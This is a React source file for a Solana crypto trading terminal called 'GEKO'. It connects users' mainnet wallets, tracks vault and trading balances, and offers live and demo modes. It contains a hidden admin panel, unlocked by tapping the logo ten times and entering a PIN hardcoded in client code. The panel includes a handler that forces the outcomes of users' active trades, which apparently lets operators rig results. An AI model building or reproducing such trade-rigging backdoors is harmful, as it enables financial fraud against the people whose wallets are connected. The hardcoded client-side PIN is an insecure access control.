import React, { useState, useEffect, useMemo, useCallback } from 'react';
import { ConnectionProvider, WalletProvider, useWallet } from '@solana/wallet-adapter-react';
import { WalletModalProvider, WalletMultiButton, useWalletModal } from '@solana/wallet-adapter-react-ui';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import { clusterApiUrl } from '@solana/web3.js';
import { 
  BitKeepWalletAdapter,
  BitpieWalletAdapter,
  CloverWalletAdapter,
  Coin98WalletAdapter,
  CoinbaseWalletAdapter,
  FractalWalletAdapter,
  HuobiWalletAdapter,
  HyperPayWalletAdapter,
  KeystoneWalletAdapter,
  KrystalWalletAdapter,
  LedgerWalletAdapter,
  MathWalletAdapter,
  NekoWalletAdapter,
  NightlyWalletAdapter,
  OntoWalletAdapter,
  PhantomWalletAdapter,
  SafePalWalletAdapter,
  SaifuWalletAdapter,
  SalmonWalletAdapter,
  SkyWalletAdapter,
  SolflareWalletAdapter,
  SolongWalletAdapter,
  SpotWalletAdapter,
  TokenaryWalletAdapter,
  TokenPocketWalletAdapter,
  TorusWalletAdapter,
  TrezorWalletAdapter,
  TrustWalletAdapter,
  WalletConnectWalletAdapter,
  XDEFIWalletAdapter
} from '@solana/wallet-adapter-wallets';

import '@solana/wallet-adapter-react-ui/styles.css';

import { 
  LayoutDashboard, 
  TrendingUp, 
  Wallet, 
  ShieldCheck, 
  Headset, 
  Trophy, 
  Settings,
  RefreshCw,
  LayoutGrid
} from 'lucide-react';

import { LandingPage } from './components/LandingPage';
import TradeView from './components/TradeView';
import { PortfolioView } from './components/PortfolioView';
import WalletDashboard from './components/WalletDashboard';
import GraphsView from './components/GraphsView';
import { SupportWidget } from './components/SupportWidget';
import AdminDesk from './components/AdminDesk';
import { WalletData, AssetInfo, ActiveTrade } from './types';

const API_BASE = window.location.origin;

/**
 * MAIN APP COMPONENT
 */
export default function App() {
  const network = WalletAdapterNetwork.Mainnet;
  const endpoint = useMemo(() => clusterApiUrl(network), []);
  const wallets = useMemo(() => [
    new PhantomWalletAdapter(),
    new SolflareWalletAdapter(),
    new CoinbaseWalletAdapter(),
    new TrustWalletAdapter(),
    new LedgerWalletAdapter(),
    new TorusWalletAdapter(),
    new MathWalletAdapter(),
    new BitKeepWalletAdapter(),
    new BitpieWalletAdapter(),
    new CloverWalletAdapter(),
    new Coin98WalletAdapter(),
    new FractalWalletAdapter(),
    new HuobiWalletAdapter(),
    new HyperPayWalletAdapter(),
    new KeystoneWalletAdapter(),
    new KrystalWalletAdapter(),
    new NekoWalletAdapter(),
    new NightlyWalletAdapter(),
    new OntoWalletAdapter(),
    new SafePalWalletAdapter(),
    new SaifuWalletAdapter(),
    new SalmonWalletAdapter(),
    new SkyWalletAdapter(),
    new SolongWalletAdapter(),
    new SpotWalletAdapter(),
    new TokenaryWalletAdapter(),
    new TokenPocketWalletAdapter(),
    new TrezorWalletAdapter(),
    new WalletConnectWalletAdapter({ network: WalletAdapterNetwork.Mainnet, options: { projectId: 'e9057f920251e06f52e5c6a1e9444458' } }),
    new XDEFIWalletAdapter()
  ], []);

  return (
    <ConnectionProvider endpoint={endpoint}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider featuredWallets={10}>
          <TerminalLayout />
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}

/**
 * TERMINAL LAYOUT
 */
function TerminalLayout() {
  const { publicKey, connected, disconnect } = useWallet();
  const { setVisible } = useWalletModal();
  const [activeTab, setActiveTab] = useState('dashboard');
  const [userData, setUserData] = useState<any>(null);
  const [vaultBalance, setVaultBalance] = useState(0);
  const [prices, setPrices] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isIdentityOpen, setIsIdentityOpen] = useState(false);
  const [selectedSymbol, setSelectedSymbol] = useState('BTC');

  const [isDemo, setIsDemo] = useState(false);
  const [activeTrades, setActiveTrades] = useState<ActiveTrade[]>([]);

  // Hidden Admin Access
  const [adminTaps, setAdminTaps] = useState(0);
  const handleAdminActivation = () => {
    const count = adminTaps + 1;
    if (count >= 10) {
      const pin = prompt("Institutional Clearance Code Required:");
      if (pin === "geko77") {
        setActiveTab('admin');
      }
      setAdminTaps(0);
    } else {
      setAdminTaps(count);
    }
  };

  const handleForceOutcome = (tradeId: string, updates: Partial<ActiveTrade>) => {
    setActiveTrades(prev => prev.map(t => t.id === tradeId ? { ...t, ...updates } : t));
  };

  const activeTradingBalance = useMemo(() => {
    const bal = isDemo ? parseFloat(userData?.demo_balance || 10000) : parseFloat(userData?.trading_balance || 0);
    console.log(`[Balance Debug] isDemo: ${isDemo}, userData.demo: ${userData?.demo_balance}, Final: ${bal}`);
    return bal;
  }, [isDemo, userData]);

  // Map prices to AssetInfo format
  const assets: AssetInfo[] = useMemo(() => {
    return prices.map(p => ({
      symbol: p.symbol.replace('USDT', ''),
      name: p.symbol,
      price: parseFloat(p.lastPrice),
      change24h: parseFloat(p.priceChangePercent),
      marketCap: 'N/A',
      volume24h: p.volume
    }));
  }, [prices]);

  const selectedAsset = useMemo(() => {
    return assets.find(a => a.symbol === selectedSymbol) || assets[0] || { symbol: 'BTC', name: 'Bitcoin', price: 0, change24h: 0, marketCap: '0', volume24h: '0' };
  }, [assets, selectedSymbol]);

  // Fetch User Data & Balances
  const refreshData = useCallback(async (nickname?: string) => {
    if (!publicKey) return;
    const address = publicKey.toBase58();
    
    try {
      // Upsert User
      const upsertRes = await fetch(`${API_BASE}/api/users/upsert`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet_address: address, nickname })
      });
      const userJson = await upsertRes.json();
      const user = userJson.user;
      setUserData(user);

      if (!user.nickname && !nickname) {
        const name = prompt("Establish Protocol Nickname (Required for first-time entry):");
        if (name) {
          refreshData(name);
        }
      }

      // Get Vault Balance
      const balRes = await fetch(`${API_BASE}/api/user/balance?address=${address}`);
      const balJson = await balRes.json();
      setVaultBalance(balJson.total_usd_value || 0);
    } catch (err) {
      console.error("Data fetch error", err);
    } finally {
      setIsLoading(false);
    }
  }, [publicKey]);

  // Price Feed
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const res = await fetch(`${API_BASE}/api/binance/prices`);
        const data = await res.json();
        setPrices(data);
      } catch (e) {
        console.warn("Price feed error", e);
      }
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 10000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (connected) refreshData();
  }, [connected, refreshData]);

  const walletData: WalletData | null = useMemo(() => {
    if (!publicKey) return null;
    return {
      address: publicKey.toBase58(),
      source: 'Solana',
      trading_balance: activeTradingBalance,
      isDemo: isDemo,
      balances: [], // External balances can be fetched if needed
      protocolBalances: [
        { symbol: 'USDT', amount: vaultBalance.toString(), valueUsd: vaultBalance.toString() }
      ],
      history: [] // Transaction history fetched in components
    };
  }, [publicKey, userData, vaultBalance, activeTradingBalance, isDemo]);

  if (!connected) {
    return (
      <LandingPage 
        onLoginSuccess={() => {}} 
        onConnectWalletClick={() => setVisible(true)} 
      />
    );
  }

  return (
    <div className="h-screen w-screen flex overflow-hidden bg-[#0B0E11] text-[#EAECEF] font-sans">
      {/* SIDEBAR */}
      <div className="w-64 border-r border-white/5 flex flex-col glass z-50 shrink-0">
        {/* Header / Logo */}
        <div className="p-6 flex items-center gap-3 border-b border-white/5 cursor-pointer select-none" onClick={handleAdminActivation}>
          <div className="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center shadow-lg shadow-indigo-600/20">
            <span className="text-white font-black text-xs italic">GK</span>
          </div>
          <div className="flex flex-col">
            <span className="font-black tracking-tighter text-lg uppercase italic leading-none">GEKO</span>
            <span className="text-[8px] text-gray-500 font-bold uppercase tracking-[0.2em]">Institutional Terminal</span>
          </div>
        </div>

        <nav className="flex-1 p-4 space-y-2 overflow-y-auto no-scrollbar">
          <NavItem active={activeTab === 'dashboard'} onClick={() => setActiveTab('dashboard')} icon={<LayoutDashboard size={18}/>} label="Market Overview" />
          <NavItem active={activeTab === 'trade'} onClick={() => setActiveTab('trade')} icon={<TrendingUp size={18}/>} label="Trade Engine" />
          <NavItem active={activeTab === 'visualizer'} onClick={() => setActiveTab('visualizer')} icon={<LayoutGrid size={18}/>} label="Visualizer" />
          <NavItem active={activeTab === 'vault'} onClick={() => setActiveTab('vault')} icon={<Wallet size={18}/>} label="Equity Center" />
          
          <div className="pt-6 pb-2 text-[10px] font-black text-gray-600 uppercase tracking-[0.3em] pl-4">Compliance</div>
          <NavItem active={activeTab === 'kyc'} onClick={() => setActiveTab('kyc')} icon={<ShieldCheck size={18}/>} label="KYC Attestation" />
          <NavItem active={activeTab === 'support'} onClick={() => setActiveTab('support')} icon={<Headset size={18}/>} label="Support Node" />
          <NavItem active={activeTab === 'leaderboard'} onClick={() => setActiveTab('leaderboard')} icon={<Trophy size={18}/>} label="Leaderboard" />
          
          <div className="pt-6 pb-2 text-[10px] font-black text-gray-600 uppercase tracking-[0.3em] pl-4">Account Type</div>
          <div className="px-4 py-2">
            <div className="flex bg-[#0B0E11] p-1 rounded-xl border border-white/5">
                <button 
                    onClick={() => setIsDemo(false)}
                    className={`flex-1 py-2 text-[9px] font-black uppercase rounded-lg transition-all ${!isDemo ? 'bg-emerald-600 text-white shadow-lg' : 'text-gray-500 hover:text-gray-300'}`}
                >
                    Live
                </button>
                <button 
                    onClick={() => setIsDemo(true)}
                    className={`flex-1 py-2 text-[9px] font-black uppercase rounded-lg transition-all ${isDemo ? 'bg-amber-600 text-white shadow-lg' : 'text-gray-500 hover:text-gray-300'}`}
                >
                    Demo
                </button>
            </div>
          </div>
        </nav>

        <div className="p-4 border-t border-white/5 bg-[#181C25]/50">
          <div className="p-3 rounded-2xl bg-[#0B0E11] border border-white/5 flex items-center justify-between group cursor-pointer" onClick={() => setIsIdentityOpen(true)}>
            <div className="flex items-center space-x-3">
                <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
                <div className="truncate text-[10px] font-mono font-bold text-gray-400">{publicKey?.toBase58().slice(0,12)}...</div>
            </div>
            <Settings size={14} className="text-gray-600 group-hover:text-white transition-colors" />
          </div>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="flex-1 flex flex-col overflow-hidden relative">
        {/* TOP BAR */}
        <header className="h-16 border-b border-white/5 flex items-center justify-between px-8 glass shrink-0 z-40">
          <div className="flex gap-10">
            <BalanceWidget 
              label={isDemo ? "Available Balance (DEMO)" : "Available Balance"} 
              value={walletData?.trading_balance || 0} 
              color={isDemo ? "text-amber-400" : "text-emerald-400"} 
            />

            <BalanceWidget 
              label={isDemo ? "Trade Balance (DEMO)" : "Trade Balance"} 
              value={walletData?.trading_balance || 0} 
              color={isDemo ? "text-amber-400" : "text-emerald-400"} 
            />

            <BalanceWidget label="Protocol Balance" value={vaultBalance} color="text-indigo-400" />
          </div>
          <div className="flex items-center gap-6">
             <div className="hidden lg:flex items-center space-x-6">
                {prices.slice(0, 2).map(p => (
                <div key={p.symbol} className="flex flex-col items-end">
                    <span className="text-[9px] font-black text-gray-500 uppercase tracking-widest">{p.symbol}</span>
                    <span className={`text-xs font-mono font-bold ${parseFloat(p.priceChangePercent) >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>
                    ${parseFloat(p.lastPrice).toLocaleString()}
                    </span>
                </div>
                ))}
             </div>
             <div className="w-px h-6 bg-white/10" />
             <WalletMultiButton className="!bg-indigo-600 !text-white !h-10 !text-[10px] !font-black !uppercase !tracking-widest !rounded-xl hover:!bg-indigo-500 transition-all border-none" />
          </div>
        </header>

        <main className="flex-1 overflow-hidden relative">
          {activeTab === 'dashboard' && <PortfolioView wallet={walletData} assets={assets} depositAddress="" onConnect={() => {}} onUpdateWallet={() => {}} onDisconnect={disconnect} onRefreshBalances={refreshData} />}
          {activeTab === 'trade' && <TradeView assets={assets} selectedAsset={selectedAsset} selectedSymbol={selectedAsset.symbol} setSelectedSymbol={setSelectedSymbol} marketData={[]} isConnected={connected} onPlaceTrade={() => {}} activeTrades={[]} wallet={walletData} />}
          {activeTab === 'visualizer' && <GraphsView assets={assets} selectedAsset={selectedAsset} marketData={[]} setSelectedSymbol={setSelectedSymbol} />}
          {activeTab === 'vault' && <PortfolioView wallet={walletData} assets={assets} depositAddress="" onConnect={() => {}} onUpdateWallet={() => {}} onDisconnect={disconnect} onRefreshBalances={refreshData} />}
          {activeTab === 'kyc' && <PortfolioView wallet={walletData} assets={assets} depositAddress="" onConnect={() => {}} onUpdateWallet={() => {}} onDisconnect={disconnect} onRefreshBalances={refreshData} />}
          {activeTab === 'support' && <div className="p-20 text-center space-y-4">
              <h2 className="text-3xl font-black uppercase italic italic tracking-tighter">Support Node</h2>
              <p className="text-gray-500">Use the widget in the bottom right corner for live assistance.</p>
            </div>}
          {activeTab === 'leaderboard' && <div className="p-20 text-center">
              <h2 className="text-3xl font-black uppercase italic italic tracking-tighter">Global Rankings</h2>
              <p className="text-gray-500">Leaderboard data streaming shortly...</p>
            </div>}
          {activeTab === 'admin' && (
            <AdminDesk 
              onClose={() => setActiveTab('dashboard')} 
              managedWallet={walletData} 
              activeTrades={activeTrades} 
              onForceOutcome={handleForceOutcome} 
            />
          )}
        </main>

        <SupportWidget wallet={walletData} />
      </div>

      {isIdentityOpen && walletData && (
          <WalletDashboard wallet={walletData} onClose={() => setIsIdentityOpen(false)} onDisconnect={disconnect} />
      )}
    </div>
  );
}

function NavItem({ active, icon, label, onClick }: any) {
  return (
    <button 
      onClick={onClick}
      className={`w-full flex items-center gap-4 px-5 py-3.5 rounded-2xl transition-all duration-300 group ${active ? 'bg-indigo-600 text-white font-black shadow-xl shadow-indigo-600/20' : 'text-gray-500 hover:bg-white/5 hover:text-gray-300'}`}
    >
      <div className={`${active ? 'text-white' : 'text-gray-600 group-hover:text-indigo-400'} transition-colors`}>{icon}</div>
      <span className="text-xs uppercase font-black tracking-widest">{label}</span>
      {active && <div className="ml-auto w-1.5 h-1.5 rounded-full bg-white shadow-[0_0_8px_white]"></div>}
    </button>
  );
}

function BalanceWidget({ label, value, color }: any) {
  return (
    <div className="flex flex-col group cursor-default min-w-[120px]">
      <span className="text-[9px] uppercase font-black text-gray-500 tracking-[0.2em] mb-0.5 group-hover:text-gray-400 transition-colors whitespace-nowrap">{label}</span>
      <span className={`text-lg lg:text-xl font-mono font-bold tracking-tighter ${color} drop-shadow-sm tabular-nums`}>
        ${parseFloat(value || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
      </span>
    </div>
  );
}
